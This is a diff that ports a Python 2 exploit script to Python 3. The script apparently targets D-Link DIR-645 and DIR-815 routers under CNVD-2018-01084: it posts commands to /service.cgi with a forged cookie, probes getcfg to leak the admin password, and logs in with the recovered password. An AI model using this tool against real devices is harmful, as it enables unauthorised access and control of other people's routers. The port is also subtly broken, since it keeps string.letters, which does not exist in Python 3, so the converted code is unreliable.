@@ -15,11 +15,11 @@
 # DIR-645 https://vuldb.com/?id.7843 (will add this in later... probably)
 # DIR-815
 
-import httplib
+import http.client
 import random
 import re
 import string
-import urllib2
+import urllib.request, urllib.error, urllib.parse
 
 HEADER = {"Cookie": "uid=" + "".join(random.choice(string.letters) for _ in range(10)),
               "Host": "localhost",
@@ -32,25 +32,25 @@ def send_post(URL,command, print_res=True):
     method = "POST"
 
     if URL.lower().startswith("https"):
-        handler = urllib2.HTTPSHandler()
+        handler = urllib.request.HTTPSHandler()
     else:
-        handler = urllib2.HTTPHandler()
+        handler = urllib.request.HTTPHandler()
 
-    opener = urllib2.build_opener(handler)
-    request = urllib2.Request(URL + "/service.cgi", data=post_content, headers=HEADER)
+    opener = urllib.request.build_opener(handler)
+    request = urllib.request.Request(URL + "/service.cgi", data=post_content, headers=HEADER)
     request.get_method = lambda: method
 
     try:
         connection = opener.open(request)
-    except urllib2.HTTPError:
-        print "Error: failed to connect to " + URL + "/service.cgi"
+    except urllib.error.HTTPError:
+        print("Error: failed to connect to " + URL + "/service.cgi")
         return False
     except:
-        print "Error: failed to connect to " + URL + "/service.cgi"
+        print("Error: failed to connect to " + URL + "/service.cgi")
         return False
 
     if not connection.code == 200:
-        print "Error: Recieved status code " + str(connection.code)
+        print("Error: Recieved status code " + str(connection.code))
         return False
 
     attempts = 0
@@ -58,13 +58,13 @@ def send_post(URL,command, print_res=True):
     while attempts < 5:
         try:
             data = connection.read()
-        except httplib.IncompleteRead:
+        except http.client.IncompleteRead:
             attempts += 1
         else:
             break
 
         if attempts == 5:
-            print "Error: Chunking failed %d times, bailing." %attempts
+            print("Error: Chunking failed %d times, bailing." %attempts)
             return False
 
     if print_res:
@@ -90,7 +90,7 @@ def create_session(URL,PASSWORD):
 
 
 def parse_results(result):
-    print result[100:]
+    print(result[100:])
     return result
 
 def query_getcfg(URL,param):
@@ -101,7 +101,7 @@ def query_getcfg(URL,param):
         if code != 200:
             return False
         if re.search("<message>Not authorized</message>", body):
-            print "Error: Not vulnerable"
+            print("Error: Not vulnerable")
             return False
     except:
         return False
@@ -150,7 +150,7 @@ def audit(arg):
         security_hole("Password:%s"%(PASSWORD),"cnvd-2018-01084")
     else:
         PASSWORD = ""
-    print "[+] Switching password to: " + PASSWORD
+    print("[+] Switching password to: " + PASSWORD)
 
     if not create_session(URL,PASSWORD):
         return False
